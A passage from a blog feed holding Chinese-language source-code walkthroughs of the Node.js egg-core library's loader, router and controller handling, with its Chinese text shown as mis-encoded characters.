$&#123;name&#125; redefined`); &#125; middlewaresMap.set(name, true); const options = this.config[name] || &#123;&#125;; let mw = app.middlewares[name]; //ä¸­é—´ä»¶çš„æ–‡ä»¶å®šä¹‰å¿…é¡» exports ä¸€ä¸ªæ™®é€š function ï¼Œå¹¶ä¸”æ¥å—ä¸¤ä¸ªå‚æ•°ï¼š // options: ä¸­é—´ä»¶çš„é…ç½®é¡¹ï¼Œæ¡†æ¶ä¼šå°† app.config[$&#123;middlewareName&#125;] ä¼ é€’è¿›æ¥, app: å½“å‰åº”ç”¨ Application çš„å®ä¾‹ //æ‰§è¡Œ exports çš„å‡½æ•°ï¼Œç”Ÿæˆæœ€ç»ˆè¦çš„ä¸­é—´ä»¶ mw = mw(options, app); mw._name = name; //åŒ…è£…ä¸­é—´ä»¶ï¼Œæœ€ç»ˆè½¬æ¢æˆ async function(ctx, next) å½¢å¼ mw = wrapMiddleware(mw, options); if (mw) &#123; app.use(mw); this.options.logger.info('[egg:loader] Use middleware: %s', name); &#125; else &#123; this.options.logger.info('[egg:loader] Disable middleware: %s', name); &#125; &#125;&#125;//é€šè¿‡ FileLoader å®ä¾‹åŠ è½½æŒ‡å®šå±æ€§çš„æ‰€æœ‰æ–‡ä»¶å¹¶å¯¼å‡ºï¼Œç„¶åå°†è¯¥å±æ€§æŒ‚è½½åœ¨ app ä¸ŠloadToApp(directory, property, opt) &#123; const target = this.app[property] = &#123;&#125;; opt = Object.assign(&#123;&#125;, &#123; directory, target, inject: this.app, &#125;, opt); new FileLoader(opt).load();&#125; loadController å‡½æ•°controller ä¸­ç”Ÿæˆçš„å‡½æ•°æœ€ç»ˆè¿˜æ˜¯åœ¨ router.js ä¸­å½“ä½œä¸€ä¸ªä¸­é—´ä»¶ä½¿ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°† controller ä¸­å†…å®¹è½¬æ¢ä¸ºä¸­é—´ä»¶å½¢å¼ async function(ctx, next) ï¼Œå…¶ä¸­ initializer è¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨æ¥é’ˆå¯¹ä¸åŒçš„æƒ…å†µå°† controller ä¸­çš„å†…å®¹è½¬æ¢ä¸ºä¸­é—´ä»¶çš„ï¼Œä¸‹é¢æ˜¯ loadController çš„å®ç°é€»è¾‘ï¼š 1234567891011121314151617181920212223242526272829303132// egg-coreæºç  -&gt; loadController å‡½æ•°å®ç°æºç loadController(opt) &#123; opt = Object.assign(&#123; caseStyle: 'lower', directory: path.join(this.options.baseDir, 'app/controller'), //è¿™ä¸ªé…ç½®ï¼Œä¸Šæ–‡æœ‰æåˆ°ï¼Œæ˜¯ä¸ºäº†å¯¹å¯¼å‡ºå¯¹è±¡åšé¢„å¤„ç†çš„å‡½æ•° initializer: (obj, opt) =&gt; &#123; //å¦‚æœæ˜¯æ™®é€šå‡½æ•°ï¼Œä¾ç„¶ç›´æ¥è°ƒç”¨å®ƒç”Ÿæˆæ–°çš„å¯¹è±¡ if (is.function(obj) &amp;&amp; !is.generatorFunction(obj) &amp;&amp; !is.class(obj) &amp;&amp; !is.asyncFunction(obj)) &#123; obj = obj(this.app); &#125; if (is.class(obj)) &#123; obj.prototype.pathName = opt.pathName; obj.prototype.fullPath = opt.path; //å¦‚æœæ˜¯ä¸€ä¸ª classï¼Œclass ä¸­çš„å‡½æ•°è½¬æ¢æˆ async function(ctx, next) ä¸­é—´ä»¶å½¢å¼ï¼Œå¹¶ç”¨ ctx å»åˆå§‹åŒ–è¯¥ class ï¼Œæ‰€ä»¥åœ¨ controller é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ this.ctx.xxx å½¢å¼ return wrapClass(obj); &#125; if (is.object(obj)) &#123; //å¦‚æœæ˜¯ä¸€ä¸ª Object ï¼Œä¼šé€’å½’çš„å°†è¯¥ Object ä¸­æ¯ä¸ªå±æ€§å¯¹åº”çš„å‡½æ•°è½¬æ¢æˆ async function(ctx, next) ä¸­é—´ä»¶å½¢å¼å½¢å¼ return wrapObject(obj, opt.path); &#125; if (is.generatorFunction(obj) || is.asyncFunction(obj)) &#123; return wrapObject(&#123; 'module.exports': obj &#125;, opt.path)['module.exports']; &#125; return obj; &#125;, &#125;, opt); // loadController å‡½æ•°åŒæ ·æ˜¯é€šè¿‡ loadToApp å‡½æ•°å°†å…¶å¯¼å‡ºå¯¹è±¡æŒ‚è½½åœ¨ app ä¸‹ï¼Œcontroller é‡Œçš„å†…å®¹åœ¨ loadRouter æ—¶ä¼šå°†å…¶è½½å…¥ const controllerBase = opt.directory; this.loadToApp(controllerBase, 'controller', opt); &#125;, loadRouter å‡½æ•°loadRouter å‡½æ•°ç‰¹åˆ«ç®€å•ï¼Œåªæ˜¯ require åŠ è½½ä¸€ä¸‹ app/router ç›®å½•ä¸‹çš„æ–‡ä»¶è€Œå·²ï¼Œè€Œæ‰€æœ‰çš„äº‹æƒ…éƒ½äº¤ç»™äº† EggCore ç±»ä¸Šçš„ router å±æ€§å»å®ç° è€Œ router åˆæ˜¯ Router ç±»çš„å®ä¾‹ï¼ŒRouter ç±»æ˜¯åŸºäº koa-router å®ç°çš„ 12345678910111213141516171819202122232425262728// egg-core æºç  -&gt; loadRouter å‡½æ•°æºç å®ç°loadRouter() &#123; this.loadFile(this.resolveModule(path.join(this.options.baseDir, 'app/router')));&#125;//è®¾ç½® router å±æ€§çš„ get æ–¹æ³•get router() &#123; //ç¼“å­˜è®¾ç½® if (this[ROUTER]) &#123; return this[ROUTER]; &#125; //æ–°å»º Router å®ä¾‹ï¼Œå…¶ä¸­ Router ç±»æ˜¯ç»§æ‰¿ koa-router å®ç°çš„ const router = this[ROUTER] = new Router(&#123; sensitive: true &#125;, this); //åœ¨å¯åŠ¨å‰å°† router ä¸­é—´ä»¶è½½å…¥å¼•ç”¨ this.beforeStart(() =&gt; &#123; this.use(router.middleware()); &#125;); return router;&#125;//å°† router ä¸Šæ‰€æœ‰çš„ method å‡½æ•°ä»£ç†åˆ° EggCore ä¸Šï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ app.get('/async', ...asyncMiddlewares, 'subController.subHome.async1') çš„æ–¹å¼é…ç½®è·¯ç”±utils.methods.concat([ 'all', 'resources', 'register', 'redirect' ]).forEach(method =&gt; &#123; EggCore.prototype[method] = function(...args) &#123; this.router[method](...args); return this; &#125;;&#125;) Router ç±»ç»§æ‰¿äº† KoaRouter ç±»ï¼Œå¹¶å¯¹å…¶çš„ method ç›¸å…³å‡½æ•°åšäº†æ‰©å±•ï¼Œè§£æ controller çš„å†™æ³•ï¼ŒåŒæ—¶æä¾›äº† resources æ–¹æ³•ï¼Œä¸ºäº†å…¼å®¹ restAPI çš„è¯·æ±‚æ–¹å¼ å…³äº restAPI çš„ä½¿ç”¨æ–¹å¼å’Œå®ç°æºç æˆ‘ä»¬è¿™é‡Œå°±ä¸ä»‹ç»äº†ï¼Œå¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œæœ‰å…·ä½“çš„æ ¼å¼è¦æ±‚ï¼Œä¸‹é¢çœ‹ä¸€ä¸‹ Router ç±»çš„éƒ¨åˆ†å®ç°é€»è¾‘ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344// egg-coreæºç  -&gt; Router ç±»å®ç°æºç class Router extends KoaRouter &#123; constructor(opts, app) &#123; super(opts); this.app = app; //å¯¹ method æ–¹æ³•è¿›è¡Œæ‰©å±• this.patchRouterMethod(); &#125; patchRouterMethod() &#123; //ä¸ºäº†æ”¯æŒ generator å‡½æ•°ç±»å‹ï¼Œä»¥åŠè·å– controller ç±»ä¸­å¯¼å‡ºçš„ä¸­é—´ä»¶ methods.concat([ 'all' ]).forEach(method =&gt; &#123; this[method] = (...args) =&gt; &#123; // spliteAndResolveRouterParams ä¸»è¦æ˜¯ä¸ºäº†æ‹†åˆ† router.js ä¸­çš„è·¯ç”±è§„åˆ™ï¼Œå°†å…¶æ‹†åˆ†æˆæ™®é€šä¸­é—´ä»¶å’Œ controller ç”Ÿæˆçš„ä¸­é—´ä»¶éƒ¨åˆ†ï¼Œè¯·çœ‹ä¸‹æ–‡æºç  const splited = spliteAndResolveRouterParams(&#123; args, app: this.app &#125;); args = splited.prefix.concat(splited.middlewares); return super[method](...args); &#125;; &#125;); &#125; //è¿”å› router é‡Œæ¯ä¸ªè·¯ç”±è§„åˆ™çš„å‰ç¼€å’Œä¸­é—´ä»¶éƒ¨åˆ† function spliteAndResolveRouterParams(&#123; args, app &#125;) &#123; let prefix; let middlewares; if (args.length &gt;= 3 &amp;&amp; (is.string(args[1]) || is.regExp(args[1]))) &#123; // app.get(name, url, [...middleware], controller) çš„å½¢å¼ prefix = args.slice(0, 2); middlewares = args.slice(2); &#125; else &#123; // app.get(url, [...middleware], controller) çš„å½¢å¼ prefix = args.slice(0, 1); middlewares = args.slice(1); &#125; // controller éƒ¨åˆ†è‚¯å®šæ˜¯æœ€åä¸€ä¸ª const controller = middlewares.pop(); // resolveController å‡½æ•°ä¸»è¦æ˜¯ä¸ºäº†å¤„ç† router.js ä¸­å…³äº controller çš„ä¸¤ç§å†™æ³•ï¼š //å†™æ³• 1 ï¼šapp.get('/async', ...asyncMiddlewares, 'subController.subHome.async1') //å†™æ³• 2 ï¼šapp.get('/async', ...asyncMiddlewares, subController.subHome.async1) //æœ€ç»ˆä» app.controller ä¸Šè·å–åˆ°çœŸæ­£çš„ controller ä¸­é—´ä»¶ï¼ŒresolveController å…·ä½“å‡½æ•°å®ç°å°±ä¸ä»‹ç»äº† middlewares.push(resolveController(controller, app)); return &#123; prefix, middlewares &#125;; &#125; æ€»ç»“ä»¥ä¸Šä¾¿æ˜¯æˆ‘å¯¹ egg-core çš„å¤§éƒ¨åˆ†æºç çš„å®ç°çš„å­¦ä¹ æ€»ç»“ï¼Œå…¶ä¸­å…³äºæºç ä¸­ä¸€äº› debug ä»£ç ä»¥åŠ timing è¿è¡Œæ—¶é—´è®°å½•çš„ä»£ç éƒ½åˆ æ‰äº†ï¼Œå…³äº app çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†çš„é‚£éƒ¨åˆ†ä»£ç å’Œ loadUnits åŠ è½½é€»è¾‘å…³ç³»ä¸å¤§ï¼Œæ‰€ä»¥æ²¡æœ‰è®²åˆ°ã€‚EggCore çš„æ ¸å¿ƒåœ¨äº EggLoaderï¼Œä¹Ÿå°±æ˜¯ pluginï¼Œconfig, extend, service, middleware, controller, router çš„åŠ è½½å‡½æ•°ï¼Œè€Œè¿™å‡ ä¸ªå†…å®¹åŠ è½½å¿…é¡»æŒ‰ç…§é¡ºåºè¿›è¡ŒåŠ è½½ï¼Œå­˜åœ¨ä¾èµ–å…³ç³»ï¼Œæ¯”å¦‚ï¼š åŠ è½½ middleware æ—¶ä¼šç”¨åˆ° config å…³äºåº”ç”¨ä¸­é—´ä»¶çš„é…ç½® åŠ è½½ router æ—¶ä¼šç”¨åˆ°å…³äº controller çš„é…ç½® è€Œ configï¼Œextendï¼Œserviceï¼Œmiddlewareï¼Œcontroller çš„åŠ è½½éƒ½å¿…é¡»ä¾èµ–äº pluginï¼Œé€šè¿‡ plugin é…ç½®è·å–æ’ä»¶ç›®å½• serviceï¼Œmiddlewareï¼Œcontrollerï¼Œrouter çš„åŠ è½½åˆå¿…é¡»ä¾èµ–äº extendï¼ˆå¯¹ app è¿›è¡Œæ‰©å±•ï¼‰ï¼Œå› ä¸ºå¦‚æœ exports æ˜¯å‡½æ•°çš„æƒ…å†µä¸‹ï¼Œä¼šå°† app ä½œä¸ºå‚æ•°æ‰§è¡Œå‡½æ•° EggCore æ˜¯ä¸€ä¸ªåŸºç¡€æ¡†æ¶ï¼Œå…¶æœ€é‡è¦çš„æ˜¯éœ€è¦éµå¾ªä¸€å®šçš„çº¦æŸå’Œçº¦å®šï¼Œå¯ä»¥ä¿è¯ä¸€è‡´çš„ä»£ç é£æ ¼ï¼Œè€Œä¸”æä¾›äº†æ’ä»¶å’Œæ¡†æ¶æœºåˆ¶ï¼Œèƒ½ä½¿ç›¸åŒçš„ä¸šåŠ¡é€»è¾‘å®ç°å¤ç”¨ï¼Œåé¢çœ‹æœ‰æ—¶é—´å†å†™ä¸€ä¸‹ Egg æ¡†æ¶çš„æºç å­¦ä¹ å¿ƒå¾— å‚è€ƒæ–‡çŒ® egg-core æºç åˆ†æ agg-core æºç  egg æºç  egg å®˜æ–¹æ–‡æ¡£]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Egg æºç åˆ†æä¹‹ egg-coreï¼ˆä¸€ï¼‰]]></title>
    <url>%2F2020%2F02%2F14%2FNode.js%2FEgg%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%20egg-core%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªçŸ¥ä¹ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://zhuanlan.zhihu.com/p/47178799 egg-core æ˜¯ä»€ä¹ˆåº”ç”¨ã€æ¡†æ¶ã€æ’ä»¶ä¹‹é—´çš„å…³ç³»åœ¨å­¦ä¹  egg-core æ˜¯ä»€ä¹ˆä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹å…³äº Egg æ¡†æ¶ä¸­åº”ç”¨ã€æ¡†æ¶ã€æ’ä»¶è¿™ä¸‰ä¸ªæ¦‚å¿µåŠå…¶ä¹‹é—´çš„å…³ç³»ï¼š ä¸€ä¸ªåº”ç”¨å¿…é¡»æŒ‡å®šä¸€ä¸ªæ¡†æ¶æ‰èƒ½è¿è¡Œèµ·æ¥ï¼Œæ ¹æ®éœ€è¦æˆ‘ä»¬å¯ä»¥ç»™ä¸€ä¸ªåº”ç”¨é…ç½®å¤šä¸ªä¸åŒçš„æ’ä»¶ï¼› æ’ä»¶åªå®Œæˆç‰¹å®šç‹¬ç«‹çš„åŠŸèƒ½ï¼Œå®ç°å³æ’å³æ‹”çš„æ•ˆæœï¼› æ¡†æ¶æ˜¯ä¸€ä¸ªå¯åŠ¨å™¨ï¼Œå¿…é¡»æœ‰å®ƒæ‰èƒ½è¿è¡Œèµ·æ¥ã€‚æ¡†æ¶è¿˜æ˜¯ä¸€ä¸ªå°è£…å™¨ï¼Œå®ƒå¯ä»¥åœ¨å·²æœ‰æ¡†æ¶çš„åŸºç¡€ä¸Šè¿›è¡Œå°è£…ï¼Œæ¡†æ¶ä¹Ÿå¯ä»¥é…ç½®æ’ä»¶ï¼Œå…¶ä¸­ Eggï¼ŒEggCore éƒ½æ˜¯æ¡†æ¶ï¼› åœ¨æ¡†æ¶çš„åŸºç¡€ä¸Šè¿˜å¯ä»¥æ‰©å±•å‡ºæ–°çš„æ¡†æ¶ï¼Œä¹Ÿå°±æ˜¯è¯´æ¡†æ¶æ˜¯å¯ä»¥æ— é™çº§ç»§æ‰¿çš„ï¼Œæœ‰ç‚¹åƒç±»çš„ç»§æ‰¿ï¼› æ¡†æ¶ã€åº”ç”¨ã€æ’ä»¶çš„å…³äº service/controller/config/middleware çš„ç›®å½•ç»“æ„é…ç½®åŸºæœ¬ç›¸åŒï¼Œç§°ä¹‹ä¸ºåŠ è½½å•å…ƒï¼ˆloadUnitï¼‰ï¼ŒåŒ…æ‹¬åé¢æºç åˆ†æä¸­çš„ getLoadUnits å‡½æ•°éƒ½æ˜¯ä¸ºäº†è·å–è¿™ä¸ªç»“æ„ï¼› 12345678910111213141516171819202122# åŠ è½½å•å…ƒçš„ç›®å½•ç»“æ„å¦‚ä¸‹å›¾ï¼Œå…¶ä¸­æ’ä»¶å’Œæ¡†æ¶æ²¡æœ‰ controller å’Œ router.js# è¿™ä¸ªç›®å½•ç»“æ„å¾ˆé‡è¦ï¼Œåé¢æ‰€æœ‰çš„ load æ–¹æ³•éƒ½æ˜¯é’ˆå¯¹è¿™ä¸ªç›®å½•ç»“æ„è¿›è¡Œçš„ loadUnit â”œâ”€â”€ package.json â”œâ”€â”€ app â”‚ â”œâ”€â”€ extend â”‚ | â”œâ”€â”€ helper.js â”‚ | â”œâ”€â”€ request.js â”‚ | â”œâ”€â”€ response.js â”‚ | â”œâ”€â”€ context.js â”‚ | â”œâ”€â”€ application.js â”‚ | â””â”€â”€ agent.js â”‚ â”œâ”€â”€ service | â”œâ”€â”€ controller â”‚ â”œâ”€â”€ middleware â”‚ â””â”€â”€ router.js â””â”€â”€ config â”œâ”€â”€ config.default.js â”œâ”€â”€ config.prod.js â”œâ”€â”€ config.test.js â”œâ”€â”€ config.local.js â””â”€â”€ config.unittest.js egg-core çš„ä¸»è¦å·¥ä½œEgg.js çš„å¤§éƒ¨åˆ†æ ¸å¿ƒä»£ç å®ç°éƒ½åœ¨ egg-core åº“ ä¸­ï¼Œegg-core ä¸»è¦ export å››ä¸ªå¯¹è±¡: EggCore ç±»ï¼šç»§æ‰¿äº Koa ï¼Œåšä¸€äº›åˆå§‹åŒ–å·¥ä½œï¼Œ EggCore ä¸­æœ€ä¸»è¦çš„ä¸€ä¸ªå±æ€§æ˜¯ loader ï¼Œä¹Ÿå°±æ˜¯ egg-core çš„å¯¼å‡ºçš„ç¬¬äºŒä¸ªç±» EggLoader çš„å®ä¾‹ EggLoader ç±»ï¼šæ•´ä¸ªæ¡†æ¶ç›®å½•ç»“æ„ï¼ˆcontrollerï¼Œserviceï¼Œmiddlewareï¼Œextendï¼Œrouter.jsï¼‰çš„åŠ è½½å’Œåˆå§‹åŒ–å·¥ä½œéƒ½åœ¨è¯¥ç±»ä¸­å®ç°çš„ï¼Œä¸»è¦æä¾›äº†å‡ ä¸ª load å‡½æ•°(loadPluginï¼ŒloadConfigï¼ŒloadMiddlewareï¼ŒloadServiceï¼ŒloadControllerï¼ŒloadRouter ç­‰)ï¼Œè¿™äº›å‡½æ•°ä¼šæ ¹æ®æŒ‡å®šç›®å½•ç»“æ„ä¸‹æ–‡ä»¶è¾“å‡ºå½¢å¼ä¸åŒè¿›è¡Œé€‚é…ï¼Œæœ€ç»ˆæŒ‚è½½è¾“å‡ºå†…å®¹ã€‚ BaseContextClass ç±»ï¼šè¿™ä¸ªç±»ä¸»è¦æ˜¯ä¸ºäº†æˆ‘ä»¬åœ¨ä½¿ç”¨æ¡†æ¶å¼€å‘æ—¶ï¼Œåœ¨ controller å’Œ service ä½œä¸ºåŸºç±»ä½¿ç”¨ï¼Œåªæœ‰ç»§æ‰¿äº†è¯¥ç±»ï¼Œæˆ‘ä»¬æ‰å¯ä»¥é€šè¿‡ this.ctx è·å–åˆ°å½“å‰è¯·æ±‚çš„ä¸Šä¸‹æ–‡å¯¹è±¡ utils å¯¹è±¡ï¼šæä¾›å‡ ä¸ªä¸»è¦çš„å‡½æ•°ï¼ŒåŒ…æ‹¬è½¬æ¢æˆä¸­é—´ä»¶å‡½æ•° middleware ï¼Œæ ¹æ®ä¸åŒç±»å‹æ–‡ä»¶è·å–æ–‡ä»¶å¯¼å‡ºå†…å®¹å‡½æ•° loadFile ç­‰ æ‰€ä»¥ egg-core åšçš„ä¸»è¦äº‹æƒ…å°±æ˜¯æ ¹æ® loadUnit çš„ç›®å½•ç»“æ„è§„èŒƒï¼Œå°†ç›®å½•ç»“æ„ä¸­çš„ configï¼Œcontrollerï¼Œserviceï¼Œmiddlewareï¼Œpluginï¼Œrouter ç­‰æ–‡ä»¶ load åˆ° app æˆ–è€… context ä¸Šï¼Œå¼€å‘äººå‘˜åªè¦æŒ‰ç…§è¿™å¥—çº¦å®šè§„èŒƒï¼Œå°±å¯ä»¥å¾ˆæ–¹ä¾¿è¿›è¡Œå¼€å‘ï¼Œä»¥ä¸‹æ˜¯ egg-core çš„ exports å¯¹è±¡æºç ï¼š 123456789101112// egg-core æºç  -&gt; å¯¼å‡ºçš„æ•°æ®ç»“æ„const EggCore = require('./lib/egg');const EggLoader = require('./lib/loader/egg_loader');const BaseContextClass = require('./lib/utils/base_context_class');const utils = require('./lib/utils');module.exports = &#123; EggCore, EggLoader, BaseContextClass, utils,&#125;; EggCore çš„å…·ä½“å®ç°æºç å­¦ä¹ EggCore ç±»æºç å­¦ä¹ EggCore ç±»æ˜¯ç®—æ˜¯ä¸Šæ–‡æåˆ°çš„æ¡†æ¶èŒƒç•´ï¼Œå®ƒä» Koa ç±»ç»§æ‰¿è€Œæ¥ï¼Œå¹¶åšäº†ä¸€äº›åˆå§‹åŒ–å·¥ä½œï¼Œå…¶ä¸­æœ‰ä¸‰ä¸ªä¸»è¦å±æ€§æ˜¯ï¼š loader ï¼šè¿™ä¸ªå¯¹è±¡æ˜¯ EggLoader çš„å®ä¾‹ï¼Œå®šä¹‰äº†å¤šä¸ª load å‡½æ•°ï¼Œç”¨äºå¯¹ loadUnit ç›®å½•ä¸‹çš„æ–‡ä»¶è¿›è¡ŒåŠ è½½ï¼Œåé¢åä¸“é—¨è®²è¿™ä¸ªç±»çš„æ˜¯å®ç°; router ï¼šæ˜¯ EggRouter ç±»çš„å®ä¾‹ï¼Œä» KoaRouter ç»§æ‰¿è€Œæ¥ï¼Œç”¨äº Egg æ¡†æ¶çš„è·¯ç”±ç®¡ç†å’Œåˆ†å‘ï¼Œè¿™ä¸ªç±»çš„å®ç°åœ¨åé¢çš„ loadRouter å‡½æ•°ä¼šæœ‰è¯´æ˜ lifecycle ï¼šè¿™ä¸ªå±æ€§ç”¨äº app çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œç”±äºå’Œæ•´ä¸ªæ–‡ä»¶åŠ è½½é€»è¾‘å…³ç³»ä¸å¤§ï¼Œæ‰€ä»¥è¿™é‡Œä¸ä½œè¯´æ˜ 123456789101112131415161718192021222324252627282930313233343536373839// egg-core æºç  -&gt; EggCore ç±»çš„éƒ¨åˆ†å®ç°const KoaApplication = require('koa');const EGG_LOADER = Symbol.for('egg#loader');class EggCore extends KoaApplication &#123; constructor(options = &#123;&#125;) &#123; super(); const Loader = this[EGG_LOADER]; //åˆå§‹åŒ– loader å¯¹è±¡ this.loader = new Loader(&#123; baseDir: options.baseDir, //é¡¹ç›®å¯åŠ¨çš„æ ¹ç›®å½• app: this, // EggCore å®ä¾‹æœ¬èº« plugins: options.plugins, //è‡ªå®šä¹‰æ’ä»¶é…ç½®ä¿¡æ¯ï¼Œè®¾ç½®æ’ä»¶é…ç½®ä¿¡æ¯æœ‰å¤šç§æ–¹å¼ï¼Œåé¢æˆ‘ä»¬ä¼šè®² logger: this.console, serverScope: options.serverScope, &#125;); &#125; get [EGG_LOADER]() &#123; return require('./loader/egg_loader'); &#125; // router å¯¹è±¡ get router() &#123; if (this[ROUTER]) &#123; return this[ROUTER]; &#125; const router = this[ROUTER] = new Router(&#123; sensitive: true &#125;, this); this.beforeStart(() =&gt; &#123; this.use(router.middleware()); &#125;); return router; &#125; // ç”Ÿå‘½å‘¨æœŸå¯¹è±¡åˆå§‹åŒ– this.lifecycle = new Lifecycle(&#123; baseDir: options.baseDir, app: this, logger: this.console, &#125;);&#125; EggLoader ç±»æºç å­¦ä¹ å¦‚æœè¯´ EggCore æ˜¯ Egg æ¡†æ¶çš„ç²¾åæ‰€åœ¨ï¼Œé‚£ä¹ˆ EggLoader å¯ä»¥è¯´æ˜¯ EggCore çš„ç²¾åæ‰€åœ¨ï¼Œä¸‹é¢æˆ‘ä»¬ä¸»è¦ä» EggLoader çš„å®ç°ç»†èŠ‚å¼€å§‹å­¦ä¹  EggCore è¿™ä¸ªåº“ï¼š EggLoader é¦–å…ˆå¯¹ app ä¸­çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼ˆpkg/eggPaths/serverEnv/appInfo/serverScope/baseDir ç­‰ï¼‰è¿›è¡Œæ•´ç†ï¼Œå¹¶ä¸”å®šä¹‰ä¸€äº›åŸºç¡€å…±ç”¨å‡½æ•°(getEggPaths/getTypeFiles/getLoadUnits/loadFile)ï¼Œæ‰€æœ‰çš„è¿™äº›åŸºç¡€å‡†å¤‡éƒ½æ˜¯ä¸ºäº†åé¢ä»‹ç»çš„å‡ ä¸ª load å‡½æ•°ä½œå‡†å¤‡ï¼Œæˆ‘ä»¬ä¸‹é¢çœ‹ä¸€ä¸‹å…¶åŸºç¡€éƒ¨åˆ†çš„å®ç°ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899// egg-coreæºç  -&gt; EggLoader ä¸­åŸºæœ¬å±æ€§å’ŒåŸºæœ¬å‡½æ•°çš„å®ç°class EggLoader &#123; constructor(options) &#123; this.options = options; this.app = this.options.app; //pkg æ˜¯æ ¹ç›®å½•çš„ package.json è¾“å‡ºå¯¹è±¡ this.pkg = utility.readJSONSync(path.join(this.options.baseDir, 'package.json')); // eggPaths æ˜¯æ‰€æœ‰æ¡†æ¶ç›®å½•çš„é›†åˆä½“ï¼Œè™½ç„¶æˆ‘ä»¬ä¸Šé¢æåˆ°ä¸€ä¸ªåº”ç”¨åªæœ‰ä¸€ä¸ªæ¡†æ¶ï¼Œä½†æ˜¯æ¡†æ¶å¯ä»¥åœ¨æ¡†æ¶çš„åŸºç¡€ä¸Šå®ç°å¤šçº§ç»§æ‰¿ï¼Œæ‰€ä»¥æ˜¯å¤šä¸ª eggPath //åœ¨å®ç°æ¡†æ¶ç±»çš„æ—¶å€™ï¼Œå¿…é¡»æŒ‡å®šå±æ€§ Symbol.for('egg#eggPath') ï¼Œè¿™æ ·æ‰èƒ½æ‰¾åˆ°æ¡†æ¶çš„ç›®å½•ç»“æ„ //ä¸‹é¢æœ‰å…³äº getEggPaths å‡½æ•°çš„å®ç°åˆ†æ this.eggPaths = this.getEggPaths(); this.serverEnv = this.getServerEnv(); //è·å– app çš„ä¸€äº›åŸºæœ¬é…ç½®ä¿¡æ¯(name,baseDir,env,scope,pkg ç­‰) this.appInfo = this.getAppInfo(); this.serverScope = options.serverScope !== undefined ? options.serverScope : this.getServerScope(); &#125; //é€’å½’è·å–ç»§æ‰¿é“¾ä¸Šæ‰€æœ‰ eggPath getEggPaths() &#123; const EggCore = require('../egg'); const eggPaths = []; let proto = this.app; //å¾ªç¯é€’å½’çš„è·å–åŸå‹é“¾ä¸Šçš„æ¡†æ¶ Symbol.for('egg#eggPath') å±æ€§ while (proto) &#123; proto = Object.getPrototypeOf(proto); //ç›´åˆ° proto å±æ€§ç­‰äº EggCore æœ¬èº«ï¼Œè¯´æ˜åˆ°äº†æœ€ä¸Šå±‚çš„æ¡†æ¶ç±»ï¼Œåœæ­¢å¾ªç¯ if (proto === Object.prototype || proto === EggCore.prototype) &#123; break; &#125; const eggPath = proto[Symbol.for('egg#eggPath')]; const realpath = fs.realpathSync(eggPath); if (!eggPaths.includes(realpath)) &#123; eggPaths.unshift(realpath); &#125; &#125; return eggPaths; &#125; //å‡½æ•°è¾“å…¥ï¼šconfig æˆ–è€… plugin ï¼Œå‡½æ•°è¾“å‡ºï¼šå½“å‰ç¯å¢ƒä¸‹çš„æ‰€æœ‰é…ç½®æ–‡ä»¶ //è¯¥å‡½æ•°ä¼šæ ¹æ® serverScopeï¼ŒserverEnv çš„é…ç½®ä¿¡æ¯ï¼Œè¿”å›å½“å‰ç¯å¢ƒå¯¹åº” filename çš„æ‰€æœ‰é…ç½®æ–‡ä»¶ //æ¯”å¦‚æˆ‘ä»¬çš„ serverEnv=prodï¼ŒserverScope=onlineï¼Œé‚£ä¹ˆè¿”å›çš„ config é…ç½®æ–‡ä»¶æ˜¯ ['config.default', 'config.online', 'config.prod', 'config.online_prod'] //è¿™å‡ ä¸ªæ–‡ä»¶åŠ è½½é¡ºåºéå¸¸é‡è¦ï¼Œå› ä¸ºæœ€ç»ˆè·å–åˆ°çš„ config ä¿¡æ¯ä¼šè¿›è¡Œæ·±åº¦çš„è¦†ç›–ï¼Œåé¢çš„æ–‡ä»¶ä¿¡æ¯ä¼šè¦†ç›–å‰é¢çš„æ–‡ä»¶ä¿¡æ¯ getTypeFiles(filename) &#123; const files = [ `$&#123;filename&#125;.default` ]; if (this.serverScope) files.push(`$&#123;filename&#125;.$&#123;this.serverScope&#125;`); if (this.serverEnv === 'default') return files; files.push(`$&#123;filename&#125;.$&#123;this.serverEnv&#125;`); if (this.serverScope) files.push(`$&#123;filename&#125;.$&#123;this.serverScope&#125;_$&#123;this.serverEnv&#125;`); return files; &#125; //è·å–æ¡†æ¶ã€åº”ç”¨ã€æ’ä»¶çš„ loadUnits ç›®å½•é›†åˆï¼Œä¸Šæ–‡æœ‰å…³äº loadUnits çš„è¯´æ˜ //è¿™ä¸ªå‡½æ•°åœ¨ä¸‹æ–‡ä¸­ä»‹ç»çš„ loadSerivce,loadMiddleware,loadConfig,loadExtend ä¸­éƒ½ä¼šç”¨åˆ°ï¼Œå› ä¸º pluginï¼Œframeworkï¼Œapp ä¸­éƒ½ä¼šæœ‰å…³ç³»è¿™äº›ä¿¡æ¯çš„é…ç½® getLoadUnits() &#123; if (this.dirs) &#123; return this.dirs; &#125; const dirs = this.dirs = []; //æ’ä»¶ç›®å½•ï¼Œå…³äº orderPlugins ä¼šåœ¨åé¢çš„loadPluginå‡½æ•°ä¸­è®²åˆ° if (this.orderPlugins) &#123; for (const plugin of this.orderPlugins) &#123; dirs.push(&#123; path: plugin.path, type: 'plugin', &#125;); &#125; &#125; //æ¡†æ¶ç›®å½• for (const eggPath of this.eggPaths) &#123; dirs.push(&#123; path: eggPath, type: 'framework', &#125;); &#125; //åº”ç”¨ç›®å½• dirs.push(&#123; path: this.options.baseDir, type: 'app', &#125;); return dirs; &#125; 